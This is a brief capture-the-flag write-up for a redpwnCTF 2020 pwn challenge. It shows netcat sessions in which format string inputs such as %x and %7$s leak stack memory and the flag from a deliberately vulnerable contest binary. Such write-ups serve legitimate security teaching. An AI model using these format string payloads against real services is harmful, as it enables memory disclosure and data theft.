### Challenge
```
pwn/secret-flag
NotDeGhost

There's a super secret flag in printf that allows you to LEAK the data at an address??

nc 2020.redpwnc.tf 31826
```

### Recon
* Prinf + Binary --> Obvious format string vuln
* using %x%x%x%x with bin execution confirms the same

### Solve
* Bruteforce
```
kali@kali$$ nc 2020.redpwnc.tf 31826
I have a secret flag, which you'll never get!
What is your name, young adventurer?
%x%x%x%x
Hello there: 51b5b5c0918f5780916262c091b1c700

kali@kali$$ nc 2020.redpwnc.tf 31826
I have a secret flag, which you'll never get!
What is your name, young adventurer?
%3$s
Hello there: H=???s1?H????

kali@kali$$ nc 2020.redpwnc.tf 31826
I have a secret flag, which you'll never get!
What is your name, young adventurer?
%7$s
Hello there: flag{n0t_s0_s3cr3t_f1ag_n0w}

kali@kali$$
```